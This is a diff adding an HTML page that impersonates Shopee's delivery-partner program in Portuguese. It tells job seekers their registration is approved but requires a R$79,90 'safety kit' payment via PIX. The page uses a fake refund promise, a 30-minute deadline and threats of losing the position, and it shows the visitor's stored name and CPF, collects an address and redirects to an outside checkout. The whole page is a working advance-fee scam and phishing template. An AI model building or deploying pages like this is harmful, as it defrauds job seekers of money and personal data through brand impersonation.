@@ -1,0 +1,619 @@
+﻿﻿
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script src="../../../scripts/utms/latest-7.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>
+  window.pixelId = "6831e7bd3fe783e25540d199";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <title> Shopee Delivery Partners - Entrega</title>
+  
+  
+  <script src="../3.4.16"></script>
+  
+  
+  <link rel="stylesheet" href="../ajax/libs/font-awesome/5.15.3/css/all.min.css">
+  
+  
+  <link href="../css2?family=Roboto:wght@400;500;700&family=Poppins:wght@400;700&display=swap" rel="stylesheet">
+  
+  
+  <style>
+    body {
+      font-family: 'Poppins', sans-serif;
+    }
+    
+    .bg-shopee {
+      background-color: #EE4D2D;
+    }
+    
+    .text-shopee {
+      color: #EE4D2D;
+    }
+    
+    .btn-primary {
+      background-color: #EE4D2D;
+      color: #fff;
+    font-weight: 500;
+    height: 50px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 3px;
+    transition: background-color 0.3s;
+    }
+    
+    .btn-primary:hover {
+      background-color:rgb(148, 48, 28);
+      color: #fff;
+    }
+    
+    .btn-primary:disabled {
+        background-color: rgb(255, 149, 128);
+        cursor: not-allowed;
+        color: #fff;
+      }
+
+    /* Custom animations */
+    @keyframes bounce {
+      0%, 80%, 100% { transform: scale(0); }
+      40% { transform: scale(1.0); }
+    }
+
+    .loading-dot {
+      animation: bounce 1.4s infinite ease-in-out both;
+    }
+
+    .loading-dot:nth-child(1) {
+      animation-delay: -0.32s;
+    }
+
+    .loading-dot:nth-child(2) {
+      animation-delay: -0.16s;
+    }
+  </style>
+</head>
+<body class="bg-white min-h-screen flex flex-col">
+  
+  <header class="bg-white shadow-md">
+    <div class="container mx-auto px-4 py-4 flex items-center justify-between">
+            <a href="index.html">
+                <img src="../736x/05/7b/27/057b274c134bcf92ac151758478949b3.jpg" alt="Shopee Logo" class="h-8 cursor-pointer">
+            </a>
+            <div class="hamburger-menu cursor-pointer">
+                <div class="w-[16px] h-[3px] bg-[#2d3562] my-1 transition-all duration-400"></div>
+                <div class="w-[20px] h-[3px] bg-[#2d3562] my-1 transition-all duration-400"></div>
+                <div class="w-[24px] h-[3px] bg-[#2d3562] my-1 transition-all duration-400"></div>
+            </div>
+        </div>
+  </header>
+  
+
+  <div class="w-full bg-[#ee4d2d] py-1 px-6 flex items-center relative overflow-hidden">
+        
+        <div class="absolute right-0 top-0 bottom-0 w-32 h-full rounded-l-full bg-[#ee4d2d]"></div>
+        
+        <div class="flex items-center relative z-10">
+            <div class="text-white mr-3">
+                <i class="fas fa-chevron-right text-3xl font-black" style="color: white;"></i>
+            </div>
+            <div class="leading-none">
+                <h1 class="text-base font-bold text-white mb-0">Motorista Parceiro</h1>
+                <p class="text-white text-sm mt-0" style="transform: translateY(-2px);"> Shopee</p>
+            </div>
+        </div>
+    </div>
+
+  <div class="flex-grow container mx-auto px-4 py-8">
+    <div class="w-full max-w-4xl mx-auto">
+      
+      <div class="bg-white shadow-md rounded-lg overflow-hidden mb-8">
+        <div class="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
+          <h3 class="font-semibold text-[#2d3562]">Status do Cadastro</h3>
+        </div>
+        <div class="p-6">
+          <div class="flex flex-col md:flex-row gap-6">
+            <div class="w-full space-y-4">
+              <div class="bg-green-50 p-4 rounded-md border border-green-200 mb-4">
+                <div class="flex items-center">
+                  <div class="text-green-500 mr-3">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                      <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                      <polyline points="22 4 12 14.01 9 11.01"></polyline>
+                    </svg>
+                  </div>
+                  <div>
+                    <h4 class="text-lg font-medium text-green-700">Aprovado - Aguardando Kit de Segurança</h4>
+                    <p class="text-sm text-green-600">Seu cadastro foi aprovado e está aguardando a confirmação do kit.</p>
+                  </div>
+                </div>
+              </div>
+              
+              <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <div>
+                  <h4 class="text-gray-700 font-medium mb-2">Dados do Entregador</h4>
+                  <div class="bg-gray-50 p-4 rounded-md">
+                    <p class="text-gray-600"><span class="font-medium">Nome:</span> <span id="userData-nome">Carregando...</span></p>
+                    <p class="text-gray-600"><span class="font-medium">CPF:</span> <span id="userData-cpf">Carregando...</span></p>
+                  </div>
+                </div>
+                
+                <div>
+                  <h4 class="text-gray-700 font-medium mb-2">Próximos Passos</h4>
+                  <div class="bg-gray-50 p-4 rounded-md">
+                    <ul class="list-disc pl-5 space-y-1 text-gray-600">
+                      <li>Adquirir Kit de Segurança oficial</li>
+                      <li>Aguardar entrega em até 5 dias úteis</li>
+                      <li>Começar a receber entregas na sua região</li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+              
+              <div class="mt-6">
+                <p class="text-sm text-gray-500 italic">
+                  Importante: Assim que o Kit de Segurança for entregue, você já estará apto para 
+                  começar a realizar entregas imediatamente pela  Shopee.
+                </p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      
+      <div class="bg-white shadow-md rounded-lg overflow-hidden mb-8">
+        <div class="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
+          <h3 class="font-semibold text-[#2d3562]">Kit de Segurança Oficial  Shopee</h3>
+        </div>
+        <div class="p-6">
+          <div class="flex flex-col md:flex-row gap-6 items-center">
+            <div class="w-full md:w-2/5">
+              <img src="img/colete2.png" alt="Kit EPI Shopee" class="w-full rounded-lg" onerror="this.src='https://via.placeholder.com/400x300?text=Kit+Segurança+Shopee'">
+            </div>
+            <div class="w-full md:w-3/5">
+              <h4 class="text-lg font-medium mb-3">Kit Completo para Entregadores</h4>
+              <p class="text-gray-600 mb-4">
+                Para garantir sua segurança durante as entregas, a Shopee exige que todos os entregadores 
+                utilizem equipamentos de proteção individual. O kit inclui:
+              </p>
+              <ul class="list-disc pl-5 mb-4 space-y-1 text-gray-700">
+                <li>2x Coletes refletivos com identificação  Shopee (amarelo)</li>
+				<li>1x Boné Exclusivo Shopee</li>
+                <li>2x Pares de luvas de proteção</li>
+                <li>Botas de segurança antiderrapantes</li>
+              </ul>
+              <div class="bg-yellow-50 p-3 rounded-md border border-yellow-200 mb-4">
+                <p class="text-sm text-yellow-800">
+                  <strong>Importante:</strong> O uso do kit completo é obrigatório durante todas 
+                  as entregas. O não uso pode resultar em suspensão temporária.
+                </p>
+              </div>
+              <div class="bg-orange-50 p-4 rounded-md border border-orange-200 mb-2">
+                <p class="text-gray-700">
+                  <span class="font-medium">Data estimada de entrega:</span> <span class="text-[#2d3562] font-medium" id="dataEntrega">Carregando...</span>
+                </p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      
+
+      <div class="bg-white shadow-md rounded-lg overflow-hidden mb-8">
+        <div class="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
+          <h3 class="font-semibold text-[#2d3562]">Endereço para Entrega</h3>
+        </div>
+        <div class="p-6">
+          <form id="enderecoForm" class="space-y-6">
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+              <div>
+                <label for="cep" class="block text-sm font-medium text-gray-700 mb-1">
+                  CEP
+                </label>
+                <input id="cep" name="cep" type="text" placeholder="00000-000" class="w-full p-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#E83D22] focus:border-transparent">
+                <p id="cep-error" class="hidden mt-1 text-sm text-red-600"></p>
+              </div>
+              
+              <div>
+                <label for="numero" class="block text-sm font-medium text-gray-700 mb-1">
+                  Número
+                </label>
+                <input id="numero" name="numero" type="text" placeholder="Número" class="w-full p-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#E83D22] focus:border-transparent">
+                <p id="numero-error" class="hidden mt-1 text-sm text-red-600"></p>
+              </div>
+            </div>
+            
+            <div>
+              <label for="logradouro" class="block text-sm font-medium text-gray-700 mb-1">
+                Logradouro
+              </label>
+              <input id="logradouro" name="logradouro" type="text" placeholder="Rua, Avenida, etc." class="w-full p-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#E83D22] focus:border-transparent">
+              <p id="logradouro-error" class="hidden mt-1 text-sm text-red-600"></p>
+            </div>
+            
+            <div>
+              <label for="complemento" class="block text-sm font-medium text-gray-700 mb-1">
+                Complemento (opcional)
+              </label>
+              <input id="complemento" name="complemento" type="text" placeholder="Apto, Bloco, etc." class="w-full p-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#E83D22] focus:border-transparent">
+            </div>
+            
+            <div>
+              <label for="bairro" class="block text-sm font-medium text-gray-700 mb-1">
+                Bairro
+              </label>
+              <input id="bairro" name="bairro" type="text" placeholder="Bairro" class="w-full p-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#E83D22] focus:border-transparent">
+              <p id="bairro-error" class="hidden mt-1 text-sm text-red-600"></p>
+            </div>
+            
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+              <div>
+                <label for="cidade" class="block text-sm font-medium text-gray-700 mb-1">
+                  Cidade
+                </label>
+                <input id="cidade" name="cidade" type="text" placeholder="Cidade" class="w-full p-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#E83D22] focus:border-transparent">
+                <p id="cidade-error" class="hidden mt-1 text-sm text-red-600"></p>
+              </div>
+              
+              <div>
+                <label for="estado" class="block text-sm font-medium text-gray-700 mb-1">
+                  Estado
+                </label>
+                <input id="estado" name="estado" type="text" placeholder="UF" class="w-full p-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#E83D22] focus:border-transparent">
+                <p id="estado-error" class="hidden mt-1 text-sm text-red-600"></p>
+              </div>
+            </div>
+            
+            <div class="bg-[#FFF8F6] p-4 rounded-md border border-[#E83D2220] mb-4">
+              <div class="flex items-start">
+                <div class="text-[#E83D22] mr-3 mt-1">
+                  <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="12" cy="12" r="10"></circle>
+                    <line x1="12" y1="8" x2="12" y2="12"></line>
+                    <line x1="12" y1="16" x2="12.01" y2="16"></line>
+                  </svg>
+                </div>
+                <div>
+                  <h4 class="text-sm font-medium text-[#E83D22]">Informação Importante:</h4>
+                  <p class="text-sm text-gray-700">
+                    Para ativar seu cadastro e se tornar um entregador  Shopee, é obrigatório a aquisição do 
+                    Kit Oficial de Entregador do  Shopee. O kit é entregue a preço de custo por <strong>R$79,90</strong>.
+                    O valor do kit será RESSARCIDO direto na sua conta após 1 semana de entregas concluidas.
+                  </p>
+                </div>
+              </div>
+            </div>
+            
+       
+            <div class="bg-red-50 border border-red-200 rounded-md p-4 mb-4">
+              <div class="flex items-start">
+                <div class="text-red-500 mt-0.5 mr-3">
+                  <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="12" cy="12" r="10"></circle>
+                    <line x1="12" y1="8" x2="12" y2="12"></line>
+                    <line x1="12" y1="16" x2="12.01" y2="16"></line>
+                  </svg>
+                </div>
+                <div>
+                  <h4 class="text-black-800 font-medium text-sm"><strong>ATENÇÃO:</strong> Aceite os termos e depois clique em "Realizar o Pagamento".</h4>
+                  <p class="text-black-700 text-sm mt-1">
+                    O pagamento do Kit de Segurança do Entregador é <strong>obrigatório</strong> e você precisa 
+                    adquirir este kit oficial para exercer a função de entregador  Shopee.
+                  </p>
+                  <p class="text-red-700 text-sm mt-2">
+                    Ao prosseguir, você se compromete a realizar o pagamento via PIX no prazo de 30 minutos, 
+                    caso contrário, perderá o direito à vaga de entregador.
+                  </p>
+                  
+                  
+                  <div class="mt-4 flex items-center">
+                    <div class="mr-1 flex-shrink-0 w-[75px]">
+                      <button id="acceptTermsBtn" type="button" class="relative inline-flex h-7 w-16 items-center rounded-full transition-colors focus:outline-none bg-gray-300">
+                        <span id="toggleThumb" class="inline-block h-6 w-6 transform rounded-full bg-white shadow-md transition-transform translate-x-1"></span>
+                      </button>
+                    </div>
+                    <span class="ml-1 text-sm font-medium text-gray-700">
+                      Concordo com os termos e me comprometo a realizar o pagamento
+                    </span>
+                  </div>
+                </div>
+              </div>
+            </div>
+            
+            
+            <button type="submit" id="payButton" class="btn-primary w-full">
+    Realizar o pagamento
+</button>
+
+          </form>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <footer class="bg-[#ee4d2d] text-white py-10 mt-auto">
+      <div class="container mx-auto px-4">
+        <div class="flex flex-col md:flex-row justify-between items-center">
+          <div class="mb-6 md:mb-0">
+            <img src="../736x/05/7b/27/057b274c134bcf92ac151758478949b3.jpg" alt="Shopee Logo" class="h-10 mb-2 mx-auto md:mx-0 bg-white p-1 rounded">
+            <p class="text-sm text-center md:text-left">© 2024  Shopee. Todos os direitos reservados.</p>
+          </div>
+          
+          <div class="text-center md:text-right">
+            <p class="text-sm opacity-80 mb-2">Programa de Parceiros Entregadores  Shopee</p>
+            <p class="text-xs opacity-70">Trabalhe conosco e faça parte da nossa equipe de entregas</p>
+          </div>
+        </div>
+      </div>
+    </footer>
+  
+
+  <div id="paymentModal" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 hidden">
+    <div class="bg-white rounded-lg max-w-md w-[95%] max-h-[90vh] overflow-y-auto p-2">
+      <div class="pb-1">
+        <h2 class="text-center text-sm font-medium">Pagamento do Kit de Segurança</h2>
+        <p class="text-center text-xs text-gray-500">
+          Finalize o pagamento para ativar seu cadastro  Shopee
+        </p>
+      </div>
+      
+      <div id="modalContent" class="space-y-3">
+                <div id="loadingState" class="flex flex-col items-center justify-center py-8">
+          <div class="inline-block h-12 w-12 animate-spin rounded-full border-4 border-solid border-[#E83D22] border-r-transparent align-[-0.125em] motion-reduce:animate-[spin_1.5s_linear_infinite]"></div>
+          <p class="mt-4 text-gray-600">Gerando QR Code para pagamento...</p>
+        </div>
+        
+        <div id="paymentContent" class="hidden">
+
+          <div class="flex flex-row gap-2 items-start">
+            <div class="flex-shrink-0">
+              <img src="img/colete2.png" alt="Kit EPI Shopee" class="w-16 rounded-md" onerror="this.src='https://via.placeholder.com/64?text=Kit'">
+            </div>
+            <div class="flex-grow">
+              <h3 class="text-sm font-medium text-gray-800">Kit de Segurança Oficial</h3>
+              <p class="text-md font-bold text-[#E83D22]">R$ 79,90</p>
+              
+              <div class="w-full mt-1">
+                <p class="text-xs text-gray-600">
+                  <span class="font-medium">Nome:</span> <span id="modalUserName">Carregando...</span>
+                </p>
+                <p class="text-xs text-gray-600">
+                  <span class="font-medium">CPF:</span> <span id="modalUserCpf">Carregando...</span>
+                </p>
+              </div>
+            </div>
+          </div>
+          
+          
+          <div class="flex items-center justify-center gap-2 py-1">
+            <div class="text-[#E83D22] animate-spin">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
+              </svg>
+            </div>
+            <p class="text-xs text-gray-600 font-medium">
+              Aguardando pagamento PIX...
+            </p>
+          </div>
+          
+          
+          <div class="flex flex-col justify-center h-[35vh]">
+            <div class="flex flex-col items-center justify-center mb-2">
+              <img src="../../../download/pix/logo-pix-512-1.png" alt="PIX Logo" class="h-7 mb-2 mx-auto">
+              <img id="qrCodeImg" src="" alt="QR Code PIX" class="w-full max-w-[160px] h-auto mx-auto">
+            </div>
+            
+            
+            <div class="bg-[#fff3e6] border-[#E83D22] border p-2 rounded-md mt-1 w-[75%] mx-auto">
+              <div class="flex items-center justify-center gap-2">
+                <div class="text-[#E83D22]">
+                  <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="12" cy="12" r="10"></circle>
+                    <polyline points="12 6 12 12 16 14"></polyline>
+                  </svg>
+                </div>
+                <div class="flex flex-col">
+                  <p class="text-xs text-gray-700 font-medium">
+                    PIX expira em <span id="timer" class="text-[#E83D22] font-bold">30:00</span>
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+          
+        
+          <div class="h-[20vh]">
+            <p class="text-xs text-gray-600 mb-1 text-center">
+              Copie o código PIX:
+            </p>
+            <div class="relative">
+              <div id="pixCode" class="bg-gray-50 p-2 rounded-md border border-gray-200 text-xs text-gray-600 break-all pr-8 max-h-[70px] overflow-y-auto">
+           
+              </div>
+              <button id="copyPixBtn" class="absolute right-1 top-1/2 transform -translate-y-1/2 text-[#E83D22] hover:text-[#d73920] p-1">
+                <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                  <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                </svg>
+              </button>
+            </div>
+            
+            <div class="mt-2">
+              <button id="copyCodeBtn" class="btn-primary w-full text-xs rounded-[3px] shadow-md transform active:translate-y-0.5 transition-transform" style="box-shadow: 0 4px 0 0 #c23218; border: none; position: relative; top: 0; height: 40px;">
+                Copiar Código PIX
+              </button>
+            </div>
+          </div>
+          
+          
+          <div style="margin-top: 10px" class="bg-yellow-50 p-2 rounded-md border border-yellow-200">
+            <p class="text-xs text-yellow-800 text-center">
+              Após o pagamento, seu cadastro será ativado automaticamente em até 5 minutos.
+            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  
+  <div id="warningModal" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 hidden">
+    <div class="bg-white rounded-lg overflow-hidden max-w-md w-[95%] p-6 flex flex-col gap-4">
+      <div class="flex items-center justify-center text-[#E83D22] mb-2">
+        <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10"></circle>
+          <line x1="12" y1="8" x2="12" y2="12"></line>
+          <line x1="12" y1="16" x2="12.01" y2="16"></line>
+        </svg>
+      </div>
+      
+      <h3 class="text-center text-base text-[#E83D22] font-bold">Atenção!</h3>
+      
+      <div class="text-center space-y-2">
+        <p class="text-sm text-gray-800 font-medium">
+          Seu cadastro ainda não está ativo pois falta apenas o Kit de Segurança Oficial dos Entregadores.
+        </p>
+        <p class="text-sm text-gray-700">
+          Se você não realizar o pagamento agora, poderá perder a vaga para outro interessado.
+        </p>
+      </div>
+      
+      <button id="warningOkBtn" class="mt-4 bg-[#E83D22] hover:bg-[#d73920] py-2 text-white font-medium shadow-lg transform active:translate-y-0.5 transition-transform" style="box-shadow: 0 4px 0 0 #c23218; border: none;">
+        OK, entendi
+      </button>
+    </div>
+  </div>
+  
+  
+  <div id="toast" class="fixed bottom-4 right-4 bg-gray-800 text-white px-4 py-2 rounded-lg shadow-lg transform translate-y-20 transition-transform duration-300 z-50 flex items-center">
+    <div class="mr-2">
+      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <polyline points="20 6 9 17 4 12"></polyline>
+      </svg>
+    </div>
+    <div>
+      <p id="toastTitle" class="font-medium">Sucesso!</p>
+      <p id="toastMessage" class="text-sm">Código PIX copiado!</p>
+    </div>
+  </div>
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    let isTermsAccepted = false;
+
+    // Carrega dados do usuário
+    const userData = JSON.parse(localStorage.getItem('user_data') || '{"nome":"Usuário","cpf":"123.456.789-00","email":"usuario@exemplo.com"}');
+    document.getElementById('userData-nome').textContent = userData.nome;
+    document.getElementById('userData-cpf').textContent = userData.cpf;
+    document.getElementById('modalUserName').textContent = userData.nome;
+    document.getElementById('modalUserCpf').textContent = userData.cpf;
+
+    // Configura data de entrega
+    const setDeliveryDate = () => {
+      const today = new Date();
+      const delivery = new Date();
+      delivery.setDate(today.getDate() + 5);
+      const days = ['Domingo','Segunda-feira','Terça-feira','Quarta-feira','Quinta-feira','Sexta-feira','Sábado'];
+      const months = ['01','02','03','04','05','06','07','08','09','10','11','12'];
+      const text = `${days[delivery.getDay()]}, ${delivery.getDate()}/${months[delivery.getMonth()]}/${delivery.getFullYear()}`;
+      const el = document.getElementById('dataEntrega');
+      if (el) el.textContent = text;
+    };
+    setDeliveryDate();
+
+    // Busca CEP e auto-preenchimento
+    const fetchCepData = async (cep) => {
+      const clean = cep.replace(/\D/g, '');
+      if (clean.length !== 8) return;
+      try {
+        const res = await fetch(`https://viacep.com.br/ws/${clean}/json/`);
+        const data = await res.json();
+        if (!data.erro) {
+          document.getElementById('logradouro').value = data.logradouro || '';
+          document.getElementById('bairro').value    = data.bairro    || '';
+          document.getElementById('cidade').value    = data.localidade|| '';
+          document.getElementById('estado').value    = data.uf        || '';
+        }
+      } catch (e) {
+        console.error(e);
+      }
+    };
+    const cepInput = document.getElementById('cep');
+    cepInput.addEventListener('blur', () => fetchCepData(cepInput.value));
+    cepInput.addEventListener('input', () => {
+      let v = cepInput.value.replace(/\D/g, '').slice(0,8);
+      cepInput.value = v.length > 5 ? `${v.slice(0,5)}-${v.slice(5)}` : v;
+    });
+
+    // Toggle termos
+    document.getElementById('acceptTermsBtn').addEventListener('click', function() {
+      isTermsAccepted = !isTermsAccepted;
+      this.classList.toggle('bg-green-500', isTermsAccepted);
+      this.classList.toggle('bg-gray-300', !isTermsAccepted);
+      const thumb = document.getElementById('toggleThumb');
+      thumb.classList.toggle('translate-x-9', isTermsAccepted);
+      thumb.classList.toggle('translate-x-1', !isTermsAccepted);
+      const btn = document.getElementById('submitBtn');
+      btn.disabled = !isTermsAccepted;
+      btn.classList.toggle('opacity-50', !isTermsAccepted);
+      btn.classList.toggle('cursor-not-allowed', !isTermsAccepted);
+    });
+
+    // Validação simples
+    const validateForm = () => {
+      let ok = true;
+      ['cep','logradouro','bairro','cidade','estado','numero'].forEach(id => {
+        const el = document.getElementById(id);
+        const err = document.getElementById(`${id}-error`);
+        if (!el || !el.value.trim()) {
+          if (err) { err.textContent = 'Obrigatório'; err.classList.remove('hidden'); }
+          ok = false;
+        } else if (err) {
+          err.classList.add('hidden');
+        }
+      });
+      return ok;
+    };
+
+    // Submit: salva e redireciona
+    document.getElementById('enderecoForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      if (!validateForm()) {
+        alert('Preencha todos os campos obrigatórios.');
+        return;
+      }
+      if (!isTermsAccepted) {
+        alert('Você precisa aceitar os termos.');
+        return;
+      }
+      // Salva endereço
+      const formData = {};
+      ['cep','logradouro','bairro','cidade','estado','numero','complemento'].forEach(id => {
+        const el = document.getElementById(id);
+        formData[id] = el ? el.value : '';
+      });
+      localStorage.setItem('endereco_entrega', JSON.stringify(formData));
+      // Recalcula entrega e redireciona
+      setDeliveryDate();
+      window.location.href = 'https://checkout.zippify.com.br/0udbaxmdzo';
+    });
+
+    // Preenche campos caso já tenha salvo
+    (function loadSaved() {
+      const saved = JSON.parse(localStorage.getItem('endereco_entrega') || '{}');
+      Object.keys(saved).forEach(id => {
+        const el = document.getElementById(id);
+        if (el) el.value = saved[id];
+      });
+    })();
+  });
+</script>
+
+</body>
+</html>
